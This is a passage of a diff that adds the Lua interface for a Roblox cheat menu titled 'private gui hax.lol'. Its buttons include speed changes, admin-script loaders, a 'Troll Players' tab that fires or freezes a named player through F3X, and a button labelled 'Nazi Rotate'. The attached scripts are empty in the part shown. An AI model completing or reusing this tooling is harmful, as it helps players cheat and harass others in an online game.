+G2L["23a"]["Text"] = [[Rain Parts Above Head]];
+G2L["23a"]["Name"] = [[Button]];
+G2L["23a"]["Position"] = UDim2.new(0.85914, 0, 0.24378, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["23b"] = Instance.new("LocalScript", G2L["23a"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["23c"] = Instance.new("TextButton", G2L["224"]);
+G2L["23c"]["TextWrapped"] = true;
+G2L["23c"]["BorderSizePixel"] = 3;
+G2L["23c"]["TextSize"] = 14;
+G2L["23c"]["TextScaled"] = true;
+G2L["23c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["23c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["23c"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["23c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["23c"]["Text"] = [[Destroy tool]];
+G2L["23c"]["Name"] = [[Button]];
+G2L["23c"]["Position"] = UDim2.new(0.0125, 0, 0.37211, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["23d"] = Instance.new("LocalScript", G2L["23c"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["23e"] = Instance.new("TextButton", G2L["224"]);
+G2L["23e"]["TextWrapped"] = true;
+G2L["23e"]["BorderSizePixel"] = 3;
+G2L["23e"]["TextSize"] = 14;
+G2L["23e"]["TextScaled"] = true;
+G2L["23e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["23e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["23e"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["23e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["23e"]["Text"] = [[Thomas Engine]];
+G2L["23e"]["Name"] = [[Button]];
+G2L["23e"]["Position"] = UDim2.new(0.18308, 0, 0.37211, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["23f"] = Instance.new("LocalScript", G2L["23e"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["240"] = Instance.new("TextButton", G2L["224"]);
+G2L["240"]["TextWrapped"] = true;
+G2L["240"]["BorderSizePixel"] = 3;
+G2L["240"]["TextSize"] = 14;
+G2L["240"]["TextScaled"] = true;
+G2L["240"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["240"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["240"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["240"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["240"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["240"]["Text"] = [[Mr Bean Admin Orbit]];
+G2L["240"]["Name"] = [[Button]];
+G2L["240"]["Position"] = UDim2.new(0.35366, 0, 0.37211, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["241"] = Instance.new("LocalScript", G2L["240"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["242"] = Instance.new("TextButton", G2L["224"]);
+G2L["242"]["TextWrapped"] = true;
+G2L["242"]["BorderSizePixel"] = 3;
+G2L["242"]["TextSize"] = 14;
+G2L["242"]["TextScaled"] = true;
+G2L["242"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["242"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["242"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["242"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["242"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["242"]["Text"] = [[X Admin]];
+G2L["242"]["Name"] = [[Button]];
+G2L["242"]["Position"] = UDim2.new(0.52111, 0, 0.37211, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["243"] = Instance.new("LocalScript", G2L["242"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["244"] = Instance.new("TextButton", G2L["224"]);
+G2L["244"]["TextWrapped"] = true;
+G2L["244"]["BorderSizePixel"] = 3;
+G2L["244"]["TextSize"] = 14;
+G2L["244"]["TextScaled"] = true;
+G2L["244"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["244"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["244"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["244"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["244"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["244"]["Text"] = [[Nilizer]];
+G2L["244"]["Name"] = [[Button]];
+G2L["244"]["Position"] = UDim2.new(0.69169, 0, 0.37211, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["245"] = Instance.new("LocalScript", G2L["244"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["246"] = Instance.new("TextButton", G2L["224"]);
+G2L["246"]["TextWrapped"] = true;
+G2L["246"]["BorderSizePixel"] = 3;
+G2L["246"]["TextSize"] = 14;
+G2L["246"]["TextScaled"] = true;
+G2L["246"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["246"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["246"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["246"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["246"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["246"]["Text"] = [[Lua Hammer]];
+G2L["246"]["Name"] = [[Button]];
+G2L["246"]["Position"] = UDim2.new(0.85914, 0, 0.37211, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["247"] = Instance.new("LocalScript", G2L["246"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.TextLabel
+G2L["248"] = Instance.new("TextLabel", G2L["224"]);
+G2L["248"]["TextWrapped"] = true;
+G2L["248"]["BorderSizePixel"] = 3;
+G2L["248"]["TextSize"] = 14;
+G2L["248"]["TextScaled"] = true;
+G2L["248"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["248"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["248"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["248"]["Size"] = UDim2.new(0, 639, 0, 26);
+G2L["248"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["248"]["Text"] = [[fe localplayer things (some of it are client sides)]];
+G2L["248"]["Position"] = UDim2.new(0.00156, 0, 0.6368, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["249"] = Instance.new("TextButton", G2L["224"]);
+G2L["249"]["TextWrapped"] = true;
+G2L["249"]["BorderSizePixel"] = 3;
+G2L["249"]["TextSize"] = 14;
+G2L["249"]["TextScaled"] = true;
+G2L["249"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["249"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["249"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["249"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["249"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["249"]["Text"] = [[WalkSpeed 50]];
+G2L["249"]["Name"] = [[Button]];
+G2L["249"]["Position"] = UDim2.new(0.0125, 0, 0.74015, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["24a"] = Instance.new("LocalScript", G2L["249"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["24b"] = Instance.new("TextButton", G2L["224"]);
+G2L["24b"]["TextWrapped"] = true;
+G2L["24b"]["BorderSizePixel"] = 3;
+G2L["24b"]["TextSize"] = 14;
+G2L["24b"]["TextScaled"] = true;
+G2L["24b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["24b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["24b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["24b"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["24b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["24b"]["Text"] = [[Empty]];
+G2L["24b"]["Name"] = [[Button]];
+G2L["24b"]["Position"] = UDim2.new(0.18308, 0, 0.50286, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["24c"] = Instance.new("TextButton", G2L["224"]);
+G2L["24c"]["TextWrapped"] = true;
+G2L["24c"]["BorderSizePixel"] = 3;
+G2L["24c"]["TextSize"] = 14;
+G2L["24c"]["TextScaled"] = true;
+G2L["24c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["24c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["24c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["24c"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["24c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["24c"]["Text"] = [[Empty]];
+G2L["24c"]["Name"] = [[Button]];
+G2L["24c"]["Position"] = UDim2.new(0.35366, 0, 0.50286, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["24d"] = Instance.new("TextButton", G2L["224"]);
+G2L["24d"]["TextWrapped"] = true;
+G2L["24d"]["BorderSizePixel"] = 3;
+G2L["24d"]["TextSize"] = 14;
+G2L["24d"]["TextScaled"] = true;
+G2L["24d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["24d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["24d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["24d"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["24d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["24d"]["Text"] = [[Empty]];
+G2L["24d"]["Name"] = [[Button]];
+G2L["24d"]["Position"] = UDim2.new(0.52111, 0, 0.50286, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["24e"] = Instance.new("TextButton", G2L["224"]);
+G2L["24e"]["TextWrapped"] = true;
+G2L["24e"]["BorderSizePixel"] = 3;
+G2L["24e"]["TextSize"] = 14;
+G2L["24e"]["TextScaled"] = true;
+G2L["24e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["24e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["24e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["24e"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["24e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["24e"]["Text"] = [[Empty]];
+G2L["24e"]["Name"] = [[Button]];
+G2L["24e"]["Position"] = UDim2.new(0.69169, 0, 0.50286, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["24f"] = Instance.new("TextButton", G2L["224"]);
+G2L["24f"]["TextWrapped"] = true;
+G2L["24f"]["BorderSizePixel"] = 3;
+G2L["24f"]["TextSize"] = 14;
+G2L["24f"]["TextScaled"] = true;
+G2L["24f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["24f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["24f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["24f"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["24f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["24f"]["Text"] = [[Empty]];
+G2L["24f"]["Name"] = [[Button]];
+G2L["24f"]["Position"] = UDim2.new(0.85914, 0, 0.50286, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["250"] = Instance.new("TextButton", G2L["224"]);
+G2L["250"]["TextWrapped"] = true;
+G2L["250"]["BorderSizePixel"] = 3;
+G2L["250"]["TextSize"] = 14;
+G2L["250"]["TextScaled"] = true;
+G2L["250"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["250"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["250"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["250"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["250"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["250"]["Text"] = [[Nazi Rotate]];
+G2L["250"]["Name"] = [[Button]];
+G2L["250"]["Position"] = UDim2.new(0.0125, 0, 0.50286, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button.LocalScript
+G2L["251"] = Instance.new("LocalScript", G2L["250"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["252"] = Instance.new("TextButton", G2L["224"]);
+G2L["252"]["TextWrapped"] = true;
+G2L["252"]["BorderSizePixel"] = 3;
+G2L["252"]["TextSize"] = 14;
+G2L["252"]["TextScaled"] = true;
+G2L["252"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["252"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["252"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["252"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["252"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["252"]["Text"] = [[Empty]];
+G2L["252"]["Name"] = [[Button]];
+G2L["252"]["Position"] = UDim2.new(0.18308, 0, 0.74015, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["253"] = Instance.new("TextButton", G2L["224"]);
+G2L["253"]["TextWrapped"] = true;
+G2L["253"]["BorderSizePixel"] = 3;
+G2L["253"]["TextSize"] = 14;
+G2L["253"]["TextScaled"] = true;
+G2L["253"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["253"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["253"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["253"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["253"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["253"]["Text"] = [[Empty]];
+G2L["253"]["Name"] = [[Button]];
+G2L["253"]["Position"] = UDim2.new(0.35366, 0, 0.74015, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["254"] = Instance.new("TextButton", G2L["224"]);
+G2L["254"]["TextWrapped"] = true;
+G2L["254"]["BorderSizePixel"] = 3;
+G2L["254"]["TextSize"] = 14;
+G2L["254"]["TextScaled"] = true;
+G2L["254"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["254"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["254"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["254"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["254"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["254"]["Text"] = [[Empty]];
+G2L["254"]["Name"] = [[Button]];
+G2L["254"]["Position"] = UDim2.new(0.52111, 0, 0.74015, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["255"] = Instance.new("TextButton", G2L["224"]);
+G2L["255"]["TextWrapped"] = true;
+G2L["255"]["BorderSizePixel"] = 3;
+G2L["255"]["TextSize"] = 14;
+G2L["255"]["TextScaled"] = true;
+G2L["255"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["255"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["255"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["255"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["255"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["255"]["Text"] = [[Empty]];
+G2L["255"]["Name"] = [[Button]];
+G2L["255"]["Position"] = UDim2.new(0.69169, 0, 0.74015, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["256"] = Instance.new("TextButton", G2L["224"]);
+G2L["256"]["TextWrapped"] = true;
+G2L["256"]["BorderSizePixel"] = 3;
+G2L["256"]["TextSize"] = 14;
+G2L["256"]["TextScaled"] = true;
+G2L["256"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["256"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["256"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["256"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["256"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["256"]["Text"] = [[Empty]];
+G2L["256"]["Name"] = [[Button]];
+G2L["256"]["Position"] = UDim2.new(0.85914, 0, 0.74015, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["257"] = Instance.new("TextButton", G2L["224"]);
+G2L["257"]["TextWrapped"] = true;
+G2L["257"]["BorderSizePixel"] = 3;
+G2L["257"]["TextSize"] = 14;
+G2L["257"]["TextScaled"] = true;
+G2L["257"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["257"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["257"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["257"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["257"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["257"]["Text"] = [[Empty]];
+G2L["257"]["Name"] = [[Button]];
+G2L["257"]["Position"] = UDim2.new(0.0125, 0, 0.88058, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["258"] = Instance.new("TextButton", G2L["224"]);
+G2L["258"]["TextWrapped"] = true;
+G2L["258"]["BorderSizePixel"] = 3;
+G2L["258"]["TextSize"] = 14;
+G2L["258"]["TextScaled"] = true;
+G2L["258"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["258"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["258"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["258"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["258"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["258"]["Text"] = [[Empty]];
+G2L["258"]["Name"] = [[Button]];
+G2L["258"]["Position"] = UDim2.new(0.18308, 0, 0.88058, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["259"] = Instance.new("TextButton", G2L["224"]);
+G2L["259"]["TextWrapped"] = true;
+G2L["259"]["BorderSizePixel"] = 3;
+G2L["259"]["TextSize"] = 14;
+G2L["259"]["TextScaled"] = true;
+G2L["259"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["259"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["259"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["259"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["259"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["259"]["Text"] = [[Empty]];
+G2L["259"]["Name"] = [[Button]];
+G2L["259"]["Position"] = UDim2.new(0.35366, 0, 0.88058, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["25a"] = Instance.new("TextButton", G2L["224"]);
+G2L["25a"]["TextWrapped"] = true;
+G2L["25a"]["BorderSizePixel"] = 3;
+G2L["25a"]["TextSize"] = 14;
+G2L["25a"]["TextScaled"] = true;
+G2L["25a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["25a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["25a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["25a"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["25a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["25a"]["Text"] = [[Empty]];
+G2L["25a"]["Name"] = [[Button]];
+G2L["25a"]["Position"] = UDim2.new(0.52111, 0, 0.88058, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["25b"] = Instance.new("TextButton", G2L["224"]);
+G2L["25b"]["TextWrapped"] = true;
+G2L["25b"]["BorderSizePixel"] = 3;
+G2L["25b"]["TextSize"] = 14;
+G2L["25b"]["TextScaled"] = true;
+G2L["25b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["25b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["25b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["25b"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["25b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["25b"]["Text"] = [[Empty]];
+G2L["25b"]["Name"] = [[Button]];
+G2L["25b"]["Position"] = UDim2.new(0.69169, 0, 0.88058, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab Page.Button
+G2L["25c"] = Instance.new("TextButton", G2L["224"]);
+G2L["25c"]["TextWrapped"] = true;
+G2L["25c"]["BorderSizePixel"] = 3;
+G2L["25c"]["TextSize"] = 14;
+G2L["25c"]["TextScaled"] = true;
+G2L["25c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["25c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["25c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["25c"]["Size"] = UDim2.new(0, 83, 0, 35);
+G2L["25c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["25c"]["Text"] = [[Empty]];
+G2L["25c"]["Name"] = [[Button]];
+G2L["25c"]["Position"] = UDim2.new(0.85914, 0, 0.88058, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X tab
+G2L["25d"] = Instance.new("TextButton", G2L["2"]);
+G2L["25d"]["TextWrapped"] = true;
+G2L["25d"]["BorderSizePixel"] = 3;
+G2L["25d"]["TextSize"] = 14;
+G2L["25d"]["TextScaled"] = true;
+G2L["25d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["25d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["25d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["25d"]["Size"] = UDim2.new(0, 67, 0, 35);
+G2L["25d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["25d"]["Text"] = [[Troll Players Tab ]];
+G2L["25d"]["Name"] = [[ScriptHub F3X tab]];
+G2L["25d"]["Position"] = UDim2.new(0.63906, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X tab.LocalScript
+G2L["25e"] = Instance.new("LocalScript", G2L["25d"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page
+G2L["25f"] = Instance.new("Frame", G2L["2"]);
+G2L["25f"]["Visible"] = false;
+G2L["25f"]["BorderSizePixel"] = 3;
+G2L["25f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["25f"]["Size"] = UDim2.new(0, 638, 0, 413);
+G2L["25f"]["Position"] = UDim2.new(0.00156, 0, 0.18056, 0);
+G2L["25f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["25f"]["Name"] = [[ScriptHub F3X Page]];
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.TextBoxPlayer
+G2L["260"] = Instance.new("TextBox", G2L["25f"]);
+G2L["260"]["Name"] = [[TextBoxPlayer]];
+G2L["260"]["BorderSizePixel"] = 3;
+G2L["260"]["TextWrapped"] = true;
+G2L["260"]["TextSize"] = 14;
+G2L["260"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["260"]["TextScaled"] = true;
+G2L["260"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["260"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["260"]["PlaceholderText"] = [[-- Enter Player Username]];
+G2L["260"]["Size"] = UDim2.new(0, 343, 0, 38);
+G2L["260"]["Position"] = UDim2.new(0.23041, 0, 0.0799, 0);
+G2L["260"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["260"]["Text"] = [[]];
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["261"] = Instance.new("TextButton", G2L["25f"]);
+G2L["261"]["TextWrapped"] = true;
+G2L["261"]["BorderSizePixel"] = 3;
+G2L["261"]["TextSize"] = 14;
+G2L["261"]["TextScaled"] = true;
+G2L["261"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["261"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["261"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["261"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["261"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["261"]["Text"] = [[Fire {F3X}]];
+G2L["261"]["Name"] = [[Button]];
+G2L["261"]["Position"] = UDim2.new(0.05639, 0, 0.28978, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["262"] = Instance.new("LocalScript", G2L["261"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["263"] = Instance.new("TextButton", G2L["25f"]);
+G2L["263"]["TextWrapped"] = true;
+G2L["263"]["BorderSizePixel"] = 3;
+G2L["263"]["TextSize"] = 14;
+G2L["263"]["TextScaled"] = true;
+G2L["263"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["263"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["263"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["263"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["263"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["263"]["Text"] = [[Freeze {F3X}]];
+G2L["263"]["Name"] = [[Button]];
+G2L["263"]["Position"] = UDim2.new(0.30404, 0, 0.2922, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["264"] = Instance.new("LocalScript", G2L["263"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["265"] = Instance.new("TextButton", G2L["25f"]);
+G2L["265"]["TextWrapped"] = true;
+G2L["265"]["BorderSizePixel"] = 3;
+G2L["265"]["TextSize"] = 14;
+G2L["265"]["TextScaled"] = true;
+G2L["265"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["265"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
